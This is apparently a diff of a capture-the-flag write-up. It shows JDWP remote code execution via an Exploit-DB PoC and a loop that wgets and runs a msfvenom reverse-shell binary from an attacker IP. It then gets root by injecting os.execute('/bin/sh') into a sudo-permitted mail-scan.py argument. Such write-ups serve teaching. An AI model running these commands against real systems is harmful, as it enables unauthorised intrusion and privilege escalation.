@@ -23,7 +23,7 @@ There is existing Java Debug Wire Protocol RCE exploit proof of concept code ava
 
 Running the unmodified PoC exploit against the host:
 
-```
+```bash
 kali@kali:~/CTF/norzh$ python2 46501.py -t 10.47.1.7 -p 18001
 [+] Targeting '10.47.1.7:18001'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
@@ -40,7 +40,7 @@ The exploit failed but it does seem that we are able to communicate with the ser
 In order to find a function that would be more likely to work, we can try to connect directly with the JDWP service.
 There is a paper available at https://www.exploit-db.com/papers/27179 written by prdelka which explains how to leak useful information and determining a likely candidates for the "break-on" function which can be used for the breakpoint during exploitation.
 
-```
+```bash
 kali@kali:~$ jdb -attach 10.47.1.7:18001
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 Set uncaught java.lang.Throwable
@@ -96,7 +96,7 @@ Method exited: return value = <void value>, "thread=Common-Cleaner", jdk.interna
 
 After attaching to the JDWP service and running `trace go methods`, we can see a few likely candidates that would be good to use as our "break-on" function. We will use `jdk.internal.ref.PhantomCleanable.isListEmpty()`.
 
-```
+```bash
 kali@kali:~/CTF/norzh$ python2 46501.py -t 10.47.1.7 -p 18001 --break-on jdk.internal.ref.PhantomCleanable.isListEmpty
 [+] Targeting '10.47.1.7:18001'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
@@ -139,7 +139,7 @@ It looks like the exploit succeeded! By default the exploit will run `uname` but
 
 First, let's generate the payload and serve it:
 
-```
+```bash
 kali@kali:~/CTF/norzh$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.120.68 LPORT=80 -f elf -o rev80.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -152,13 +152,13 @@ Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
 ```
 
 Start a netcat listener:
-```
+```bash
 kali@kali:~$ sudo nc -nlvp 80
 [sudo] password for kali:
 listening on [any] 80 ...
 ```
 
-```
+```bash
 kali@kali:~/CTF/norzh$ for cmd in "wget http://172.16.120.68:443/rev80.elf -O /tmp/rev80.elf" "chmod +x /tmp/rev80.elf" "/tmp/rev80.elf"; do python2 46501.py -t 10.47.1.7 -p 18001 --break-on jdk.internal.ref.PhantomCleanable.isListEmpty --cmd "$cmd"; done
 [+] Targeting '10.47.1.7:18001'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
@@ -203,7 +203,7 @@ kali@kali:~/CTF/norzh$ for cmd in "wget http://172.16.120.68:443/rev80.elf -O /t
 
 We should now have a reverse shell as `e11i0t`!
 
-```
+```bash
 kali@kali:~$ sudo nc -nlvp 80
 [sudo] password for kali:
 listening on [any] 80 ...
@@ -219,7 +219,7 @@ e11i0t@team-188-erdosamphetamineaddiction-kali:/tmp/hsperfdata_e11i0t$
 
 Running `sudo -l`, we notice that we can run a script called `mail-scan.py` as root without entering a password:
 
-```
+```bash
 e11i0t@team-188-erdosamphetamineaddiction-kali:/tmp/hsperfdata_e11i0t$ sudo -l
 Matching Defaults entries for e11i0t on team-188-erdosamphetamineaddiction-kali:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -230,7 +230,7 @@ User e11i0t may run the following commands on team-188-erdosamphetamineaddiction
 
 Contents of `/home/e11i0t/scripts/mail-scan.py`
 
-```
+```python
 #!/usr/bin/env python3
 #coding: utf-8
 
@@ -392,23 +392,25 @@ Note: Technically, you could also use any public IP which has that port open and
 
 Start a netcat listener on port 25 on your attacker machine so that nmap will execute our script:
 
-```
+```bash
 kali@kali:~/CTF/norzh$ nc -nlvp 25
 listening on [any] 25 ...
 ```
 
 Run the `mail-scan.py` script using the below command:
 
-```
+```bash
 sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 --mail $'root@localhost"    \nos.execute("/bin/sh")"'
 ```
 
+```
 e11i0t@team-188-erdosamphetamineaddiction-kali:/home/e11i0t/scripts$ sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 -->
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 09:18 UTC
 # root
 # check-pass.py  mail-scan.py  mkcd.py
 # flag  run_ghidra.sh
 # NORZH{e11i0t_1s_s0_1337!!}
+```
 
 Flag: `NORZH{e11i0t_1s_s0_1337!!}`
 
